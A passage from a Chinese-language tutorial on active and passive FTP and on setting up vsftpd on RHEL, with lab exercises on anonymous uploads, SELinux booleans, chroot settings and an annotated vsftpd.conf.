P命令给客户端。然后客户端发起从本地端口N+1到服务器的端口P的连接用来传送数据。 对于服务器端的防火墙来说，必须允许下面的通讯才能支持被动方式的FTP: FTP服务器命令（21）端口接受客户端任意端口（客户端初始连接） FTP服务器命令（21）端口到客户端端口（&gt;1023）（服务器响应客户端命令） FTP服务器数据端口（&gt;1023）接受客户端端口（&gt;1023）（客户端初始化数据连接到服务器指定的任意端口） FTP服务器数据端口（&gt;1023）到客户端端口（&gt;1023）（服务器发送ACK响应和数据到客户端的数据端口） 用图表示如下： 在第1步中，客户端的命令端口与服务器的命令端口建立连接，并发送命令“PASV”。然后在第2步中，服务器返回命令”PORT 2024”，告诉客户端（服务器）用哪个端口侦听数据连接。在第3步中，客户端初始化一个从自己的数据端口到服务器端指定的数据端口的数据连接。最后服务器在第4 步中给客户端的数据端口返回一个”ACK”响应。 被动方式的FTP解决了客户端的许多问题，但同时给服务器端带来了更多的问题。最大的问题是需要允许从任意远程终端到服务器高位端口的连接。幸运的是，许多FTP守护程序，包括流行的WU-FTPD允许管理员指定FTP服务器使用的端口范围。详细内容参看附录1。 第二个问题是客户端有的支持被动模式，有的不支持被动模式，必须考虑如何能支持这些客户端，以及为他们提供解决办法。例如，Solaris提供的FTP命令行工具就不支持被动模式，需要第三方的FTP客户端，比如ncftp。 随着WWW的广泛流行，许多人习惯用web浏览器作为FTP客户端。大多数浏览器只在访问ftp://这样的URL时才支持被动模式。这到底是好还是坏取决于服务器和防火墙的配置。 下面的图表会帮助管理员们记住每种FTP方式是怎样工作的： 主动FTP： 命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口 数据连接：客户端 &gt;1023端口 &lt;- 服务器 20端口 被动FTP： 命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口 数据连接：客户端 &gt;1023端口 -&gt; 服务器 &gt;1023端口 下面是主动与被动FTP优缺点的简要总结： 主动FTP对FTP服务器的管理有利，但对客户端的管理不利。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙阻塞掉。被动FTP对FTP客户端的管理有利，但对服务器端的管理不利。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。 幸运的是，有折衷的办法。既然FTP服务器的管理员需要他们的服务器有最多的客户连接，那么必须得支持被动FTP。我们可以通过为FTP服务器指定一个有限的端口范围来减小服务器高位端口的暴露。这样，不在这个范围的任何端口会被服务器的防火墙阻塞。虽然这没有消除所有针对服务器的危险，但它大大减少了危险。 VSFTPD 软件如果你想在你的Linux/Unix服务器上搭建一个安全、高性能、稳定性好的FTP服务器，那么vsftpd可能是你的首选应用。vsftpd意思为“very secure FTP daemon(非常安全的FTP进程)”，是一个基于GPL发布的类UNIX类操作系统上运行的服务器的名字（是一种守护进程），可以运行在诸如Linux、BSD、Solaris、HP-UX以及Irix等系统上面。vsftpd支持很多其他传统的FTP服务器不支持的良好特性。 最新的vsftpd版本可在其官网获取：www.vsftpd.org vsftpd 是“very secure FTP daemon”的缩写，安全性是它的一个最大的特点。vsftpd 是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux、BSD、Solaris、 HP-UNIX等系统上面，是一个完全免费的、开发源代码的ftp服务器软件，支持很多其他的 FTP 服务器所不支持的特征。比如：非常高的安全性需求、带宽限制、良好的可伸缩性、可创建虚拟用户、支持IPv6、速率高等。 看看都有哪些网站在使用vsftpd吧： 12345678910111213141516171819ftp.RedHat.comftp.SUSE.comftp.debian.orgftp.openbsd.orgftp.freebsd.orgftp.gnu.orgftp.gnome.orgftp.kde.orgftp.kernel.orgrpmfind.netftp.linux.org.ukftp.gimp.orgftp-stud.fht-esslingen.degd.tuwien.ac.atftp.sunet.seftp.ximian.comftp.engardelinux.orgftp.sunsite.org.ukftp.isc.org 什么是vsftpdVsftpd是一种在GPL许可下开放源代码的FTP服务器，用于多种UNIX系统和Linux系统。Vsftpd也称为Very Secure FTP Daemon，它是一种安全、快速、稳定的FTP服务器，能够高效地处理大量的并发连接。 Vsftpd的主要特点包括： 提供安全的体系结构，根据任务的最低特权需求单独执行每个任务。 支持虚拟IP配置，可以在提供一个IP地址的情况下，在域中用该地址建立多个FTP服务器。 允许配置并使用虚拟用户，从而与系统用户账户分离。 支持TCP封装。 允许配置匿名服务器，用户可以在不需要身份验证的情况下上传和下载文件。 性能稳定，可以处理大量的并发连接。 可以配置为独立的服务器。 Vsftpd服务器支持带宽控制。 用户类型 r 真实用户 这类用户是指在FTP服务上拥有帐号，即/etc/passwd里的用户。当这类用户登录FTP服务器的时候，其默认的主目录就是其帐号命名的目录。但是，其还可以变更到其他目录中去。如系统的主目录等等。 g 来宾用户 在vsFTP软件里没有这类用户，但是在FTP服务器中有，我们往往会给不同的部门或者某个特定的用户设置一个帐户。但是，这个账户有个特点，就是其只能够访问自己的主目录。服务器通过这种方式来保障FTP服务上其他文件的安全性。这类帐户，在Vsftpd软件中就叫做Guest用户。拥有这类用户的帐户，只能够访问其主目录下的目录，而不得访问主目录以外的文件。 a 匿名用户 Anonymous（匿名）用户，这也是我们通常所说的匿名访问。这类用户是指在FTP服务器中没有指定帐户，但是其仍然可以进行匿名访问某些公开的资源。在组建FTP服务器的时候，我们就需要根据用户的类型，对用户进行归类。默认情况下，Vsftpd服务器会把建立的所有帐户都归属为Real用户。但是，这往往不符合企业安全的需要。因为这类用户不仅可以访问自己的主目录，而且，还可以访问其他用户的目录。这就给其他用户所在的空间带来一定的安全隐患。所以，企业要根据实际情况，修改用户所在的类别。 项目实践1: 设置vsftpd服务匿名用户能够对/var/ftp/pub/目录有上传下载的权限实验准备阶段 网络拓扑图 规划软件安装 修改配置文件 启动服务 注意防火墙关闭 客户端测试服务 网络拓扑图 规划软件安装 具体步骤Linux几乎所有的发行版本都内置了Vsftpd服务。 服务器端rhel6 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113[root@rhel6 ~]# yum install -y vsftpdLoaded plugins: product-id, refresh-packagekit, security, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Setting up Install ProcessResolving Dependencies--&gt; Running transaction check---&gt; Package vsftpd.x86_64 0:2.2.2-11.el6_4.1 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved============================================================================================= Package Arch Version Repository Size=============================================================================================Installing: vsftpd x86_64 2.2.2-11.el6_4.1 server 151 kTransaction Summary=============================================================================================Install 1 Package(s)Total download size: 151 kInstalled size: 331 kDownloading Packages:vsftpd-2.2.2-11.el6_4.1.x86_64.rpm | 151 kB 00:00 Running rpm_check_debugRunning Transaction TestTransaction Test SucceededRunning Transaction Installing : vsftpd-2.2.2-11.el6_4.1.x86_64 1/1 Verifying : vsftpd-2.2.2-11.el6_4.1.x86_64 1/1Installed: vsftpd.x86_64 0:2.2.2-11.el6_4.1 Complete![root@rhel6 ~]# service iptables stopiptables: Setting chains to policy ACCEPT: filter [ OK ]iptables: Flushing firewall rules: [ OK ]iptables: Unloading modules: [ OK ][root@rhel6 ~]# getenforceEnforcing[root@rhel6 ~]# rpm -q vsftpdvsftpd-2.2.2-11.el6_4.1.x86_64[root@rhel6 ~]# rpm -ql vsftpd/etc/logrotate.d/vsftpd/etc/pam.d/vsftpd/etc/rc.d/init.d/vsftpd/etc/vsftpd/etc/vsftpd/ftpusers/etc/vsftpd/user_list/etc/vsftpd/vsftpd.conf/etc/vsftpd/vsftpd_conf_migrate.sh/usr/sbin/vsftpd/usr/share/doc/vsftpd-2.2.2/usr/share/doc/vsftpd-2.2.2/AUDIT/usr/share/doc/vsftpd-2.2.2/BENCHMARKS/usr/share/doc/vsftpd-2.2.2/BUGS/usr/share/doc/vsftpd-2.2.2/COPYING/usr/share/doc/vsftpd-2.2.2/Changelog/usr/share/doc/vsftpd-2.2.2/EXAMPLE/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/README/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/README.configuration/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/vsftpd.conf/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE/vsftpd.xinetd/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD/README/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD/README.configuration/usr/share/doc/vsftpd-2.2.2/EXAMPLE/INTERNET_SITE_NOINETD/vsftpd.conf/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG/README/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG/README.configuration/usr/share/doc/vsftpd-2.2.2/EXAMPLE/PER_IP_CONFIG/hosts.allow/usr/share/doc/vsftpd-2.2.2/EXAMPLE/README/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_HOSTS/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_HOSTS/README/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/README/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/README.configuration/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/logins.txt/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/vsftpd.conf/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS/vsftpd.pam/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS_2/usr/share/doc/vsftpd-2.2.2/EXAMPLE/VIRTUAL_USERS_2/README/usr/share/doc/vsftpd-2.2.2/FAQ/usr/share/doc/vsftpd-2.2.2/INSTALL/usr/share/doc/vsftpd-2.2.2/LICENSE/usr/share/doc/vsftpd-2.2.2/README/usr/share/doc/vsftpd-2.2.2/README.security/usr/share/doc/vsftpd-2.2.2/REWARD/usr/share/doc/vsftpd-2.2.2/SECURITY/usr/share/doc/vsftpd-2.2.2/SECURITY/DESIGN/usr/share/doc/vsftpd-2.2.2/SECURITY/IMPLEMENTATION/usr/share/doc/vsftpd-2.2.2/SECURITY/OVERVIEW/usr/share/doc/vsftpd-2.2.2/SECURITY/TRUST/usr/share/doc/vsftpd-2.2.2/SIZE/usr/share/doc/vsftpd-2.2.2/SPEED/usr/share/doc/vsftpd-2.2.2/TODO/usr/share/doc/vsftpd-2.2.2/TUNING/usr/share/doc/vsftpd-2.2.2/vsftpd.xinetd/usr/share/man/man5/vsftpd.conf.5.gz/usr/share/man/man8/vsftpd.8.gz/var/ftp/var/ftp/pub[root@rhel6 ~]# service vsftpd startStarting vsftpd for vsftpd: [ OK ][root@rhel6 ~]# netstat -luntp|grep vsftpdtcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 2940/vsftpd 客户端 rhel7 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192[root@rhel7 ~]# yum install -y lftpLoaded plugins: langpacks, product-id, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.server | 4.1 kB 00:00:00 (1/2): server/group_gz | 134 kB 00:00:00 (2/2): server/primary_db | 3.4 MB 00:00:00 Resolving Dependencies--&gt; Running transaction check---&gt; Package lftp.x86_64 0:4.4.8-3.el7 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved============================================================================================= Package Arch Version Repository Size=============================================================================================Installing: lftp x86_64 4.4.8-3.el7 server 749 kTransaction Summary=============================================================================================Install 1 PackageTotal download size: 749 kInstalled size: 2.4 MDownloading packages:lftp-4.4.8-3.el7.x86_64.rpm | 749 kB 00:00:00 Running transaction checkRunning transaction testTransaction test succeededRunning transaction Installing : lftp-4.4.8-3.el7.x86_64 1/1server/productid | 1.6 kB 00:00:00 Verifying : lftp-4.4.8-3.el7.x86_64 1/1Installed: lftp.x86_64 0:4.4.8-3.el7 Complete![root@rhel7 ~]# systemctl stop firewalld[root@rhel7 ~]# getenforceEnforcing[root@rhel7 ~]# rpm -ql lftp/etc/lftp.conf/usr/bin/lftp/usr/bin/lftpget/usr/lib64/lftp/usr/lib64/lftp/4.4.8/usr/lib64/lftp/4.4.8/cmd-mirror.so/usr/lib64/lftp/4.4.8/cmd-sleep.so/usr/lib64/lftp/4.4.8/cmd-torrent.so/usr/lib64/lftp/4.4.8/liblftp-network.so/usr/lib64/lftp/4.4.8/liblftp-pty.so/usr/lib64/lftp/4.4.8/proto-file.so/usr/lib64/lftp/4.4.8/proto-fish.so/usr/lib64/lftp/4.4.8/proto-ftp.so/usr/lib64/lftp/4.4.8/proto-http.so/usr/lib64/lftp/4.4.8/proto-sftp.so/usr/lib64/liblftp-jobs.so.0/usr/lib64/liblftp-jobs.so.0.0.0/usr/lib64/liblftp-tasks.so.0/usr/lib64/liblftp-tasks.so.0.0.0/usr/share/doc/lftp-4.4.8/usr/share/doc/lftp-4.4.8/BUGS/usr/share/doc/lftp-4.4.8/COPYING/usr/share/doc/lftp-4.4.8/ChangeLog/usr/share/doc/lftp-4.4.8/FAQ/usr/share/doc/lftp-4.4.8/FEATURES/usr/share/doc/lftp-4.4.8/NEWS/usr/share/doc/lftp-4.4.8/README/usr/share/doc/lftp-4.4.8/README.debug-levels/usr/share/doc/lftp-4.4.8/README.dnssec/usr/share/doc/lftp-4.4.8/README.modules/usr/share/doc/lftp-4.4.8/THANKS/usr/share/doc/lftp-4.4.8/TODO/usr/share/locale/cs/LC_MESSAGES/lftp.mo/usr/share/locale/de/LC_MESSAGES/lftp.mo/usr/share/locale/es/LC_MESSAGES/lftp.mo/usr/share/locale/fr/LC_MESSAGES/lftp.mo/usr/share/locale/it/LC_MESSAGES/lftp.mo/usr/share/locale/ja/LC_MESSAGES/lftp.mo/usr/share/locale/ko/LC_MESSAGES/lftp.mo/usr/share/locale/pl/LC_MESSAGES/lftp.mo/usr/share/locale/pt_BR/LC_MESSAGES/lftp.mo/usr/share/locale/ru/LC_MESSAGES/lftp.mo/usr/share/locale/zh_CN/LC_MESSAGES/lftp.mo/usr/share/locale/zh_HK/LC_MESSAGES/lftp.mo/usr/share/locale/zh_TW/LC_MESSAGES/lftp.mo/usr/share/man/man1/lftp.1.gz/usr/share/man/man1/lftpget.1.gz/usr/share/man/man5/lftp.conf.5.gz 1.从客户端以匿名用户来访问ftp服务 123456[root@rhel7 ~]# lftp 172.25.0.11lftp 172.25.0.11:~&gt; cd pubcd ok, cwd=/publftp 172.25.0.11:/pub&gt; lslftp 172.25.0.11:/pub&gt; put rhel7put: Access failed: 550 Permission denied. (rhel7) 当前的情况 匿名用户能够访问/var/ftp/pub，能够查看文件内容，能够下载；不能上传文件,不能删除文件。 问题的解决 报错550，没有权限上传文件 我们要分析权限有哪些？ vsftpd的配置文件 UGO、特殊、隐藏、ACL、 SELINUX 1.修改主配置文件 12vim /etc/vsftpd/vsftpd.confanon_upload_enable=YES 2./var/ftp/pub 目录o-rwx 12[root@rhel6 pub]# ll -d /var/ftp/pubdrwxr-xrwx. 2 root root 4096 Aug 3 10:35 /var/ftp/pub 3.测试 12lftp 172.25.0.11:/pub&gt; put rhel7put: Access failed: 553 Could not create file. (rhel7) 目前修改了配置文件和ugo权限还是报错553，不能create file 我们分析一下，只有selinux的权限问题了 4.SELINUX 如何确定是否是selinux的原因，可以通过以下步骤： 1)先关闭selinux，测试ok的 2)开启selinux，测试no的 我们需要去分析selinux的记录，分析工具是sealert,由setroubleshoot软件安装。 查看当前系统中是否有sealert工具 which sealert 安装setroubleshoot yum install -y setroubleshoot 分析selinux记录 sealert -a /var/log/audit/audit.log 1234567891011121314***** Plugin allow_anon_write (53.1 confidence) suggests *******************If you want to allow /usr/sbin/vsftpd to be able to write to shared public contentThen you need to change the label on pub to public_content_rw_t, and potentially turn on theallow_httpd_sys_script_anon_write boolean.Do# semanage fcontext -a -t public_content_rw_t pub# restorecon -R -v pub# setsebool -P allow_ftpd_anon_write 1[root@rhel6 pub]# semanage fcontext -a -t public_content_rw_t /var/ftp/pub[root@rhel6 pub]# restorecon -R -v /var/ftp/pub[root@rhel6 pub]# ll -Zd /var/ftp/pubdrwxr-xrwx. root root system_u:object_r:public_content_rw_t:s0 /var/ftp/pub 5.再测试 1234lftp 172.25.0.11:/pub&gt; put rhel7lftp 172.25.0.11:/pub&gt; ls-rw------- 1 14 50 0 Aug 03 05:53 rhel7lftp 172.25.0.11:/pub&gt; exit 此时，我们发现匿名用户已经可以成功地对/var/ftp/pub目录进行上传下载了！ 项目实践2: 真实用户（系统用户）能够访问家目录，上传下载删除在项目实践1的基础上完成。 服务端 rhel6 1234567891011121314[root@rhel6 ftp]# id studentuid=500(student) gid=500(student) groups=500(student)[root@rhel6 ftp]# passwd studentChanging password for user student.New password:BAD PASSWORD: it is based on a dictionary wordRetype new password:passwd: all authentication tokens updated successfully.[root@rhel6 ftp]# su - student[student@rhel6 ~]$ pwd/home/student[student@rhel6 ~]$ touch file1[student@rhel6 ~]$ echo aaa &gt; file1 客户端 rhel7 1234[root@rhel7 ~]# lftp student@172.25.0.11Password:lftp student@172.25.0.11:~&gt; ls ls: Login failed: 500 OOPS: cannot change directory:/home/student 当前的情况 系统用户student不能访问家目录。 问题的解决 报错500，没有权限进入用户家目录 配置文件没有问题，ugo权限没有问题，只剩下selinux，需要分析 1.分析selinux 123456789# 服务器端[root@rhel6 ftp]# sealert -a /var/log/audit/audit.log***** Plugin catchall_boolean (47.5 confidence) suggests *******************If you want to allow ftp to read and write files in the user home directoriesThen you must tell SELinux about this by enabling the &apos;ftp_home_dir&apos;boolean.Dosetsebool -P ftp_home_dir 1 2.修改布尔值 1[root@rhel6 ftp]# setsebool -P ftp_home_dir 1 3.测试 123456789101112131415161718192021222324# 客户端lftp student@172.25.0.11:~&gt; lslftp student@172.25.0.11:~&gt; pwd ftp://student@172.25.0.11/%2Fhome/studentlftp student@172.25.0.11:~&gt; ls-rw-rw-r-- 1 500 500 4 Aug 03 07:13 file1lftp student@172.25.0.11:~&gt; cat file1aaa4 bytes transferredlftp student@172.25.0.11:~&gt; get file14 bytes transferredlftp student@172.25.0.11:~&gt; put.ICEauthority .bashrc .dbus/ .tcshrc Music/ Videos/ rhel7.bash_history .cache/ .esd_auth Desktop/ Pictures/ anaconda-ks.cfg test1.bash_logout .config/ .local/ Documents/ Public/ file1.bash_profile .cshrc .ssh/ Downloads/ Templates/ initial-setup-ks.cfglftp student@172.25.0.11:~&gt; put rhel7lftp student@172.25.0.11:~&gt; ls-rw-rw-r-- 1 500 500 4 Aug 03 07:13 file1-rw-r--r-- 1 500 500 0 Aug 03 07:13 rhel7lftp student@172.25.0.11:~&gt; rm file1rm ok, \\`file1\\&apos; removedlftp student@172.25.0.11:~&gt; ls-rw-r--r-- 1 500 500 0 Aug 03 07:13 rhel7 系统用户已经可以实现能够访问家目录，并且能够下载、上传、删除了！ 项目实践3: 除了系统用户student有chroot的权限，其他系统用户没有chroot的权限 匿名用户的根目录 /var/ftp/ 系统用户的根目录 /home/student/ chroot_local_user=YES chroot_local_user=NO chroot_list_enable=YES 不能换根，有例外 都能换根，有例外 chroot_list_enable=NO 不能换根，没例外 都能换根，没例外 如果指定 chroot_list_enable=YES 则需要指定文件位置 chroot_list_file=/etc/vsftpd/chroot_list 12345678[root@rhel7 ~]# lftp batman@172.25.0.11Password:lftp batman@172.25.0.11:~&gt; ls lftp batman@172.25.0.11:~&gt; cd /tmpcd ok, cwd=/tmplftp batman@172.25.0.11:/tmp&gt; pwdftp://batman@172.25.0.11/%2Ftmplftp batman@172.25.0.11:/tmp&gt; exit 当前的情况 所有的系统用户都能够chroot，而要求除了student用户之外的所有系统用户都不能chroot。 解决方法 可以选择不能换根，有例外 1.修改配置文件 12345# 服务器端[root@rhel6 ~]# vim /etc/vsftpd/vsftpd.confchroot_local_user=YESchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_list 2.创建chroot_list 123[root@rhel6 ~]# vim /etc/vsftpd/chroot_list[root@rhel6 ~]# cat /etc/vsftpd/chroot_liststudent 3.重启服务 123[root@rhel6 ~]# service vsftpd restartShutting down vsftpd: [ OK ]Starting vsftpd for vsftpd: [ OK ] 2.测试 1234567891011# 客户端 [root@rhel7 ~]# lftp batman@172.25.0.11Password:lftp batman@172.25.0.11:~&gt; cd /etc/cd: Access failed: 550 Failed to change directory. (/etc)lftp batman@172.25.0.11:/&gt; exit[root@rhel7 ~]# lftp student@172.25.0.11Password:lftp student@172.25.0.11:~&gt; cd /etccd ok, cwd=/etc lftp student@172.25.0.11:/etc&gt; exit 当前的情况 系统用户student可以切换根目录，而batman不在chroot_list文件中所以不能切换根目录。 拓展内容为什么root用户不能通过ftp协议访问服务器？ 1234[root@rhel7 ~]# lftp root@172.25.0.11Password:lftp root@172.25.0.11:~&gt; ls ls: Login failed: 530 Permission denied. 因为有用户访问控制列表/etc/vsftpd/user_list 123456789101112131415161718192021222324[root@rhel6 ~]# grep userlist_enable /etc/vsftpd/vsftpd.confuserlist_enable=YES[root@rhel6 ftp]# cat /etc/vsftpd/user_list# vsftpd userlist# If userlist_deny=NO, only allow users in this file# If userlist_deny=YES (default), never allow users in this file, and# do not even prompt for a password.# Note that the default vsftpd pam config also checks /etc/vsftpd/ftpusers# for users that are denied.rootbindaemonadmlpsyncshutdownhaltmailnewsuucpoperatorgamesnobody 了解vsftpd的配置文件 配置文件 说明 /etc/vsftpd/vsftpd.conf 主配置文件 /usr/sbin/vsftpd Vsftpd的主程序 /etc/rc.d/init.d/vsftpd 启动脚本 /etc/pam.d/vsftpd PAM认证文件（此文件中file=/etc/vsftpd/ftpusers字段，指明阻止访问的用户来自/etc/vsftpd/ftpusers文件中的用户） /etc/vsftpd/ftpusers 禁止使用vsftpd的用户列表文件。记录不允许访问FTP服务器的用户名单，管理员可以把一些对系统安全有威胁的用户账号记录在此文件中，以免用户从FTP登录后获得大于上传下载操作的权利，而对系统造成损坏。 /etc/vsftpd/user_list 禁止或允许使用vsftpd的用户列表文件。这个文件中指定的用户缺省情况（即在/etc/vsftpd/vsftpd.conf中设置userlist_deny=YES）下也不能访问FTP服务器，在设置了userlist_deny=NO时,仅允许user_list中指定的用户访问FTP服务器。 /var/ftp 匿名用户主目录；本地用户主目录为：/home/用户主目录，即登录后进入自己家目录 /var/ftp/pub 匿名用户的下载目录，此目录需赋权根chmod 1777 pub（1为特殊权限，使上载后无法删除） /etc/logrotate.d/vsftpd.log Vsftpd的日志文件 vsftpd的主配置文件/etc/vsftpd/vsftpd.conf说明和Linux系统中的大多数配置文件一样，vsftpd的配置文件中以#开始注释。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109是否允许匿名登录FTP服务器，默认设置为YES允许# 用户可使用用户名ftp或anonymous进行ftp登录，口令为用户的E-mail地址。# 如不允许匿名访问则设置为NOanonymous_enable=YES# 是否允许本地用户(即linux系统中的用户帐号)登录FTP服务器，默认设置为YES允许# 本地用户登录后会进入用户主目录，而匿名用户登录后进入匿名用户的下载目录/var/ftp/pub# 若只允许匿名用户访问，前面加上#注释掉即可阻止本地用户访问FTP服务器local_enable=YES# 是否允许本地用户对FTP服务器文件具有写权限，默认设置为YES允许write_enable=YES# 掩码，本地用户默认掩码为077# 你可以设置本地用户的文件掩码为缺省022，也可根据个人喜好将其设置为其他值#local_umask=022# 是否允许匿名用户上传文件，须将全局的write_enable=YES。默认为YES#anon_upload_enable=YES# 是否允许匿名用户创建新文件夹#anon_mkdir_write_enable=YES# 是否激活目录欢迎信息功能# 当用户用CMD模式首次访问服务器上某个目录时，FTP服务器将显示欢迎信息# 默认情况下，欢迎信息是通过该目录下的.message文件获得的# 此文件保存自定义的欢迎信息，由用户自己建立#dirmessage_enable=YES# 是否让系统自动维护上传和下载的日志文件# 默认情况该日志文件为/var/log/vsftpd.log,也可以通过下面的xferlog_file选项对其进行设定# 默认值为NOxferlog_enable=YES# Make sure PORT transfer connections originate from port 20 (ftp-data).# 是否设定FTP服务器将启用FTP数据端口的连接请求# ftp-data数据传输，21为连接控制端口connect_from_port_20=YES# 设定是否允许改变上传文件的属主，与下面一个设定项配合使用# 注意，不推荐使用root用户上传文件#chown_uploads=YES# 设置想要改变的上传文件的属主，如果需要，则输入一个系统用户名# 可以把上传的文件都改成root属主。whoever：任何人#chown_username=whoever# 设定系统维护记录FTP服务器上传和下载情况的日志文件# /var/log/vsftpd.log是默认的，也可以另设其它#xferlog_file=/var/log/vsftpd.log# 是否以标准xferlog的格式书写传输日志文件# 默认为/var/log/xferlog，也可以通过xferlog_file选项对其进行设定# 默认值为NO#xferlog_std_format=YES# 以下是附加配置，添加相应的选项将启用相应的设置# 是否生成两个相似的日志文件# 默认在/var/log/xferlog和/var/log/vsftpd.log目录下# 前者是wu_ftpd类型的传输日志，可以利用标准日志工具对其进行分析；后者是vsftpd类型的日志#dual_log_enable# 是否将原本输出到/var/log/vsftpd.log中的日志，输出到系统日志#syslog_enable# 设置数据传输中断间隔时间，此语句表示空闲的用户会话中断时间为600秒# 即当数据传输结束后，用户连接FTP服务器的时间不应超过600秒。可以根据实际情况对该值进行修改#idle_session_timeout=600# 设置数据连接超时时间，该语句表示数据连接超时时间为120秒，可根据实际情况对其个修改#data_connection_timeout=120# 运行vsftpd需要的非特权系统用户，缺省是nobody#nopriv_user=ftpsecure# 是否识别异步ABOR请求。# 如果FTP client会下达“async ABOR”这个指令时，这个设定才需要启用# 而一般此设定并不安全，所以通常将其取消#async_abor_enable=YES# 是否以ASCII方式传输数据。默认情况下，服务器会忽略ASCII方式的请求。# 启用此选项将允许服务器以ASCII方式传输数据# 不过，这样可能会导致由&quot;SIZE /big/file&quot;方式引起的DoS攻击#ascii_upload_enable=YES#ascii_download_enable=YES# 登录FTP服务器时显示的欢迎信息# 如有需要，可在更改目录欢迎信息的目录下创建名为.message的文件，并写入欢迎信息保存后#ftpd_banner=Welcome to blah FTP service.# 黑名单设置。如果很讨厌某些email address，就可以使用此设定来取消他的登录权限# 可以将某些特殊的email address抵挡住。#deny_email_enable=YES# 当上面的deny_email_enable=YES时，可以利用这个设定项来规定哪些邮件地址不可登录vsftpd服务器# 此文件需用户自己创建，一行一个email address即可#banned_email_file=/etc/vsftpd/banned_emails# 用户登录FTP服务器后是否具有访问自己目录以外的其他文件的权限# 设置为YES时，用户被锁定在自己的home目录中，vsftpd将在下面chroot_list_file选项值的位置寻找chroot_list文件# 必须与下面的设置项配合#chroot_list_enable=YES# 被列入此文件的用户，在登录后将不能切换到自己目录以外的其他目录# 从而有利于FTP服务器的安全管理和隐私保护。此文件需自己建立#chroot_list_file=/etc/vsftpd/chroot_list# 是否允许递归查询。默认为关闭，以防止远程用户造成过量的I/O#ls_recurse_enable=YES# 是否允许监听。# 如果设置为YES，则vsftpd将以独立模式运行，由vsftpd自己监听和处理IPv4端口的连接请求listen=YES# 设定是否支持IPV6。如要同时监听IPv4和IPv6端口，# 则必须运行两套vsftpd，采用两套配置文件# 同时确保其中有一个监听选项是被注释掉的#listen_ipv6=YES# 设置PAM外挂模块提供的认证服务所使用的配置文件名，即/etc/pam.d/vsftpd文件# 此文件中file=/etc/vsftpd/ftpusers字段，说明了PAM模块能抵挡的帐号内容来自文件/etc/vsftpd/ftpusers中#pam_service_name=vsftpd# 是否允许ftpusers文件中的用户登录FTP服务器，默认为NO# 若此项设为YES，则user_list文件中的用户允许登录FTP服务器# 而如果同时设置了userlist_deny=YES，则user_list文件中的用户将不允许登录FTP服务器，甚至连输入密码提示信息都没有#userlist_enable=YES/NO# 设置是否阻扯user_list文件中的用户登录FTP服务器，默认为YES#userlist_deny=YES/NO# 是否使用tcp_wrappers作为主机访问控制方式。# tcp_wrappers可以实现linux系统中网络服务的基于主机地址的访问控制# 在/etc目录中的hosts.allow和hosts.deny两个文件用于设置tcp_wrappers的访问控制# 前者设置允许访问记录，后者设置拒绝访问记录。# 如想限制某些主机对FTP服务器192.168.57.2的匿名访问，编缉/etc/hosts.allow文件，如在下面增加两行命令：# vsftpd:192.168.57.1:DENY 和vsftpd:192.168.57.9:DENY# 表明限制IP为192.168.57.1/192.168.57.9主机访问IP为192.168.57.2的FTP服务器# 此时FTP服务器虽可以PING通，但无法连接tcp_wrappers=YES 除了上述那些基本设定，我们还可以在vsftpd.conf文件中添加更多的安全选项。其中几个常用的如下： 限制最大连接数和传输速率 在FTP服务器的管理中，无论对本地用户还是匿名用户，对于FTP服务器资源的使用都需要进行控控制，避免由于负担过大造成FTP服务器运行异常，可以添加以下配置项对FTP客户机使用FTP服务器资源进行控制： max_client设置项 用于设置FTP服务器所允许的最大客户端连接数，值为0时表示不限制。例如max_client=100表示FTP服务器的所有客户端最大连接数不超过100个。 max_per_ip设置项 用于设置对于同一IP地址允许的最大客户端连接数，值为0时表示不限制。例如max_per_ip=5表示同一IP地址的FTP客户机与FTP服务器建立的最大连接数不超过5个。 local_max_rate设置项 用于设置本地用户的最大传输速率，单位为B/s，值为0时表示不限制。例如local_max_rate=500000表示FTP服务器的本地用户最大传输速率设置为500KB/s. anon_max_rate设置项 用于设置匿名用户的最大传输速率，单位为B/s,值为0表示不限制。例如ano_max_rate=200000，表示FTP服务器的匿名用户最大传输速率设置为200KB/s. 指定用户的权限设置 